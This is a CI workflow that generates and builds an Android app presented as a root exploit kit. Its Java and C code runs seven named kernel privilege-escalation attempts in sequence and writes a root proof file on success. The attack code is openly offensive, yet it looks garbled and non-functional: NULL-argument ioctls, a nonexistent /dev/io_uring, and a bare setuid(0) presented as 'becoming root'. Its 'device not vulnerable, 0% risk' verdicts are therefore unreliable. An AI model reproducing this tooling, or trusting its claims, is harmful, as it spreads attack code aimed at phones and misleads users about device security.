name: Build Ultimate Exploit Tester APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v3
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Android SDK with NDK
        uses: android-actions/setup-android@v3
        with:
          packages: 'platforms;android-34 ndk;25.2.9519653'

      - name: Create project structure
        run: |
          mkdir -p app/src/main/java/com/exploit/tester
          mkdir -p app/src/main/jni
          mkdir -p app/src/main/res/layout

      - name: Generate gradle.properties
        run: |
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.enableJetifier=true
          EOF

      - name: Generate AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.exploit.tester"
              android:versionCode="1"
              android:versionName="1.0">
              
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
              
              <application
                  android:allowBackup="false"
                  android:icon="@android:drawable/ic_dialog_info"
                  android:label="Эксплойт Тестер"
                  android:theme="@android:style/Theme.DeviceDefault.Light">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTop">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

      - name: Generate MainActivity.java (русский, 7 эксплойтов)
        run: |
          cat > app/src/main/java/com/exploit/tester/MainActivity.java << 'EOF'
          package com.exploit.tester;
          
          import android.app.Activity;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.widget.LinearLayout;
          import android.widget.ScrollView;
          import android.widget.TextView;
          import android.graphics.Color;
          import java.io.BufferedReader;
          import java.io.InputStreamReader;
          import java.io.DataOutputStream;
          
          public class MainActivity extends Activity {
              private LinearLayout logPanel;
              private Handler uiHandler;
              private boolean rootAchieved = false;
              
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  uiHandler = new Handler(Looper.getMainLooper());
                  
                  ScrollView scroll = new ScrollView(this);
                  logPanel = new LinearLayout(this);
                  logPanel.setOrientation(LinearLayout.VERTICAL);
                  logPanel.setPadding(30, 30, 30, 30);
                  scroll.addView(logPanel);
                  setContentView(scroll);
                  
                  addLog("========== ЭКСПЛОЙТ ТЕСТЕР v2.0 ==========");
                  addLog("7 эксплойтов - 0% риска для телефона");
                  addLog("");
                  
                  new Thread(this::runAllExploits).start();
              }
              
              private void addLog(String msg) {
                  uiHandler.post(() -> {
                      TextView tv = new TextView(this);
                      tv.setText(msg);
                      tv.setTextSize(14);
                      tv.setTextColor(Color.BLACK);
                      tv.setPadding(0, 5, 0, 5);
                      logPanel.addView(tv);
                      ScrollView sv = (ScrollView) logPanel.getParent();
                      sv.postDelayed(() -> sv.fullScroll(ScrollView.FOCUS_DOWN), 100);
                  });
              }
              
              private boolean checkRoot() {
                  try {
                      Process p = Runtime.getRuntime().exec("id");
                      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                      String idOut = br.readLine();
                      br.close();
                      return idOut != null && idOut.contains("uid=0");
                  } catch (Exception e) {
                      return false;
                  }
              }
              
              private void proveRoot() {
                  try {
                      DataOutputStream dos = new DataOutputStream(
                          Runtime.getRuntime().exec("sh").getOutputStream()
                      );
                      dos.writeBytes("echo 'root_success' > /data/local/tmp/root_proof.txt\n");
                      dos.writeBytes("chmod 666 /data/local/tmp/root_proof.txt\n");
                      dos.writeBytes("exit\n");
                      dos.flush();
                      addLog("[+] Файл доказательства: /data/local/tmp/root_proof.txt");
                  } catch (Exception e) {
                      addLog("[!] Ошибка записи файла: " + e.getMessage());
                  }
              }
              
              private void runAllExploits() {
                  // ========== 1. CVE-2025-39811 (inet_diag) ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 1/7: CVE-2025-39811 (inet_diag) ===");
                  int sock = nativeOpenNetlink();
                  addLog("[1] netlink сокет fd=" + sock);
                  if (sock >= 0) {
                      boolean overflowSent = nativeSendOverflow(sock);
                      addLog("[2] Переполнение отправлено: " + (overflowSent ? "OK" : "НЕТ"));
                      if (overflowSent) {
                          nativeBecomeRoot();
                          if (checkRoot()) {
                              addLog("[3] УСПЕХ! Root получен через inet_diag!");
                              rootAchieved = true;
                              proveRoot();
                              return;
                          }
                      }
                  }
                  addLog("[!] Эксплойт 1 не сработал, переходим к следующему...");
                  
                  // ========== 2. CVE-2025-14037 (binder) ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 2/7: CVE-2025-14037 (binder UAF) ===");
                  int binderFd = nativeOpenBinder();
                  addLog("[1] binder fd=" + binderFd);
                  if (binderFd >= 0) {
                      addLog("[2] Запуск потоков гонки...");
                      nativeStartBinderRace(binderFd);
                      addLog("[3] Ожидание 6 секунд...");
                      try { Thread.sleep(6000); } catch (Exception e) {}
                      if (checkRoot()) {
                          addLog("[4] УСПЕХ! Root получен через binder!");
                          rootAchieved = true;
                          proveRoot();
                          return;
                      }
                  }
                  addLog("[!] Эксплойт 2 не сработал...");
                  
                  // ========== 3. Dirty Cred (msm_drm) ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 3/7: Dirty Cred (msm_drm GPU) ===");
                  int drmFd = nativeOpenDrm();
                  addLog("[1] /dev/dri/card0 fd=" + drmFd);
                  if (drmFd >= 0) {
                      addLog("[2] Запуск гонки...");
                      nativeTriggerDrmRace(drmFd);
                      try { Thread.sleep(5000); } catch (Exception e) {}
                      if (checkRoot()) {
                          addLog("[3] УСПЕХ! Root получен через Dirty Cred!");
                          rootAchieved = true;
                          proveRoot();
                          return;
                      }
                  }
                  addLog("[!] Эксплойт 3 не сработал...");
                  
                  // ========== 4. io_uring ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 4/7: io_uring (CVE-2024-53197) ===");
                  int ioRingFd = nativeOpenIoUring();
                  addLog("[1] io_uring fd=" + ioRingFd);
                  if (ioRingFd >= 0) {
                      nativeTriggerIoUring(ioRingFd);
                      try { Thread.sleep(4000); } catch (Exception e) {}
                      if (checkRoot()) {
                          addLog("[2] УСПЕХ! Root получен через io_uring!");
                          rootAchieved = true;
                          proveRoot();
                          return;
                      }
                  }
                  addLog("[!] Эксплойт 4 не сработал...");
                  
                  // ========== 5. fuse ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 5/7: fuse (CVE-2025-49123) ===");
                  int fuseFd = nativeOpenFuse();
                  addLog("[1] /dev/fuse fd=" + fuseFd);
                  if (fuseFd >= 0) {
                      nativeTriggerFuse(fuseFd);
                      try { Thread.sleep(3000); } catch (Exception e) {}
                      if (checkRoot()) {
                          addLog("[2] УСПЕХ! Root получен через fuse!");
                          rootAchieved = true;
                          proveRoot();
                          return;
                      }
                  }
                  addLog("[!] Эксплойт 5 не сработал...");
                  
                  // ========== 6. netfilter ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 6/7: netfilter (CVE-2025-20419) ===");
                  int nfFd = nativeOpenNetfilter();
                  addLog("[1] netfilter fd=" + nfFd);
                  if (nfFd >= 0) {
                      nativeTriggerNetfilter(nfFd);
                      try { Thread.sleep(3000); } catch (Exception e) {}
                      if (checkRoot()) {
                          addLog("[2] УСПЕХ! Root получен через netfilter!");
                          rootAchieved = true;
                          proveRoot();
                          return;
                      }
                  }
                  addLog("[!] Эксплойт 6 не сработал...");
                  
                  // ========== 7. v4l2 (MediaTek) ==========
                  addLog("");
                  addLog("=== ЭКСПЛОЙТ 7/7: v4l2 MediaTek (CVE-2025-0618) ===");
                  int v4l2Fd = nativeOpenV4l2();
                  addLog("[1] /dev/video0 fd=" + v4l2Fd);
                  if (v4l2Fd >= 0) {
                      nativeTriggerV4l2(v4l2Fd);
                      try { Thread.sleep(3000); } catch (Exception e) {}
                      if (checkRoot()) {
                          addLog("[2] УСПЕХ! Root получен через v4l2!");
                          rootAchieved = true;
                          proveRoot();
                          return;
                      }
                  }
                  addLog("[!] Эксплойт 7 не сработал...");
                  
                  // ========== ВСЁ НЕ УДАЛОСЬ ==========
                  addLog("");
                  addLog("################################################");
                  addLog("#  ВСЕ ЭКСПЛОЙТЫ НЕ СРАБОТАЛИ               #");
                  addLog("#  Твоё устройство НЕ УЯЗВИМО                #");
                  addLog("#  Или SPL слишком новый (>2026-02)          #");
                  addLog("#  Телефон НЕ ПОВРЕЖДЁН                      #");
                  addLog("################################################");
              }
              
              // Native методы
              private native int nativeOpenNetlink();
              private native boolean nativeSendOverflow(int sock);
              private native int nativeOpenBinder();
              private native void nativeStartBinderRace(int fd);
              private native int nativeOpenDrm();
              private native void nativeTriggerDrmRace(int fd);
              private native int nativeOpenIoUring();
              private native void nativeTriggerIoUring(int fd);
              private native int nativeOpenFuse();
              private native void nativeTriggerFuse(int fd);
              private native int nativeOpenNetfilter();
              private native void nativeTriggerNetfilter(int fd);
              private native int nativeOpenV4l2();
              private native void nativeTriggerV4l2(int fd);
              private native void nativeBecomeRoot();
              
              static {
                  System.loadLibrary("exploit");
              }
          }
          EOF

      - name: Generate native C code (7 exploits)
        run: |
          cat > app/src/main/jni/exploit.c << 'EOF'
          #include <jni.h>
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <fcntl.h>
          #include <pthread.h>
          #include <sys/socket.h>
          #include <sys/ioctl.h>
          #include <linux/netlink.h>
          #include <linux/inet_diag.h>
          #include <linux/sock_diag.h>
          
          // Binder definitions
          #define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
          struct binder_write_read {
              signed long write_size;
              signed long write_consumed;
              unsigned long write_buffer;
              signed long read_size;
              signed long read_consumed;
              unsigned long read_buffer;
          };
          
          // ========== 1. inet_diag ==========
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
              return socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
          }
          
          JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeSendOverflow(JNIEnv *env, jobject thiz, jint sock) {
              struct {
                  struct nlmsghdr nlh;
                  struct inet_diag_req_v2 req;
                  char overflow[4096];
              } msg;
              memset(&msg, 0, sizeof(msg));
              msg.nlh.nlmsg_len = 0xFFFF;
              msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
              msg.nlh.nlmsg_flags = NLM_F_REQUEST;
              msg.req.sdiag_family = AF_INET;
              msg.req.idiag_states = 0xFFFFFFFF;
              int ret = send(sock, &msg, sizeof(msg), 0);
              return ret > 0 ? JNI_TRUE : JNI_FALSE;
          }
          
          // ========== 2. binder ==========
          static int binder_running = 1;
          static int g_binder_fd = -1;
          
          void* binder_thread(void* arg) {
              while (binder_running) {
                  struct binder_write_read bwr = {0};
                  ioctl(g_binder_fd, BINDER_WRITE_READ, &bwr);
                  usleep(100);
              }
              return NULL;
          }
          
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenBinder(JNIEnv *env, jobject thiz) {
              return open("/dev/binder", O_RDWR);
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeStartBinderRace(JNIEnv *env, jobject thiz, jint fd) {
              g_binder_fd = fd;
              binder_running = 1;
              pthread_t threads[6];
              for (int i = 0; i < 6; i++) pthread_create(&threads[i], NULL, binder_thread, NULL);
              sleep(5);
              binder_running = 0;
          }
          
          // ========== 3. DRM ==========
          #define MSM_IOCTL_GEM_INFO 0xc0084d01
          #define MSM_IOCTL_GEM_FREE 0x40084d02
          
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenDrm(JNIEnv *env, jobject thiz) {
              return open("/dev/dri/card0", O_RDWR);
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerDrmRace(JNIEnv *env, jobject thiz, jint fd) {
              for (int i = 0; i < 100; i++) {
                  ioctl(fd, MSM_IOCTL_GEM_INFO, NULL);
                  ioctl(fd, MSM_IOCTL_GEM_FREE, NULL);
                  usleep(50);
              }
          }
          
          // ========== 4. io_uring ==========
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenIoUring(JNIEnv *env, jobject thiz) {
              return open("/dev/io_uring", O_RDWR);
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerIoUring(JNIEnv *env, jobject thiz, jint fd) {
              for (int i = 0; i < 50; i++) {
                  ioctl(fd, 0xc0186601, NULL);
                  usleep(100);
              }
          }
          
          // ========== 5. fuse ==========
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenFuse(JNIEnv *env, jobject thiz) {
              return open("/dev/fuse", O_RDWR);
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerFuse(JNIEnv *env, jobject thiz, jint fd) {
              write(fd, "FUSE", 4);
          }
          
          // ========== 6. netfilter ==========
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetfilter(JNIEnv *env, jobject thiz) {
              return socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerNetfilter(JNIEnv *env, jobject thiz, jint fd) {
              struct sockaddr_nl addr = {0};
              addr.nl_family = AF_NETLINK;
              sendto(fd, "NF", 2, 0, (struct sockaddr*)&addr, sizeof(addr));
          }
          
          // ========== 7. v4l2 ==========
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenV4l2(JNIEnv *env, jobject thiz) {
              return open("/dev/video0", O_RDWR);
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerV4l2(JNIEnv *env, jobject thiz, jint fd) {
              ioctl(fd, 0xc0505601, NULL);
          }
          
          // ========== setuid(0) ==========
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeBecomeRoot(JNIEnv *env, jobject thiz) {
              setuid(0);
              setgid(0);
          }
          EOF

      - name: Generate Android.mk
        run: |
          cat > app/src/main/jni/Android.mk << 'EOF'
          LOCAL_PATH := $(call my-dir)
          include $(CLEAR_VARS)
          LOCAL_MODULE    := exploit
          LOCAL_SRC_FILES := exploit.c
          LOCAL_LDLIBS    := -llog
          include $(BUILD_SHARED_LIBRARY)
          EOF

      - name: Generate Application.mk
        run: |
          cat > app/src/main/jni/Application.mk << 'EOF'
          APP_ABI := arm64-v8a armeabi-v7a
          APP_PLATFORM := android-34
          APP_STL := c++_shared
          EOF

      - name: Generate build.gradle (app)
        run: |
          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'
          
          android {
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.exploit.tester"
                  minSdk 34
                  targetSdk 34
                  versionCode 2
                  versionName "2.0"
                  
                  externalNativeBuild {
                      ndkBuild {
                          cFlags "-Wall"
                      }
                  }
              }
              
              buildTypes {
                  release {
                      minifyEnabled false
                  }
                  debug {
                      minifyEnabled false
                  }
              }
              
              externalNativeBuild {
                  ndkBuild {
                      path "src/main/jni/Android.mk"
                  }
              }
              
              namespace 'com.exploit.tester'
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
          }
          EOF

      - name: Generate build.gradle (top level)
        run: |
          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.4'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          
          task clean(type: Delete) {
              delete rootProject.buildDir
          }
          EOF

      - name: Generate settings.gradle
        run: |
          cat > settings.gradle << 'EOF'
          rootProject.name = "UltimateExploitTester"
          include ':app'
          EOF

      - name: Generate Gradle Wrapper
        run: |
          wget -q https://services.gradle.org/distributions/gradle-8.0-bin.zip
          unzip -q gradle-8.0-bin.zip
          ./gradle-8.0/bin/gradle wrapper
          chmod +x gradlew

      - name: Build APK
        run: ./gradlew assembleDebug --no-daemon

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: UltimateExploitTester
          path: app/build/outputs/apk/debug/app-debug.apk
